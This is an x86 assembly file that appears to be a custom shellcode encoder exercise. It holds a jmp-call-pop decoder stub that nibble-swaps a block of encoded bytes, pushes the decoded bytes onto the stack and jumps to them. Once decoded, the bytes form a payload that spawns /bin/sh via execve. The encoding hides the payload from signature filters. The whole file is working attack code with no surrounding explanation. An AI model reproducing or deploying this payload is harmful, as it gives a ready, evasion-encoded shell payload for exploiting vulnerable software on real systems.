global _start

section       .text
_start:

	jmp short call_decoder

decoder:
	pop esi			;get address of encoded shellcode
	xor ecx, ecx		;clear ecx
	mov cl, len		;put size of shellcode in ecx
	sar cl, 1		;divide by 2 to adjust the counter
	

decode:
	xor ebx, ebx		;clear ebx
	mov  al, byte [esi]	;get first byte of shellcode
	ror al, 0x4		;switch hex values
	xor bl, al		;store decoded byte into ebx
	rol ebx, 0x8		;shift bl to bh to make room for the following byte
	mov al, byte [esi + 1]	;get second byte of shellcode
	ror al, 0x4		;switch hex values
	xor bl, al		;store decoded byte into bl, so now bx contains two bytes of decoded shellcode
	push bx			;push two decoded shellcode bytes to stack
	add esi, 0x2		;increase shellcode address pointer by 2
	loop decode		

	jmp esp			;decoded shellcode is located directly at esp, so simply jump to it


call_decoder:
	call decoder
	encoded_shellcode: db 0x09,0x08,0xdc,0xb0,0x0b,0x2c,0x98,0x1c,0x98,0x3e,0x98,0xe6,0x96,0x26,0xf2,0x86,0x86,0x37,0xf2,0xf2,0x86,0x05,0x0c,0x13
	len equ $ - encoded_shellcode
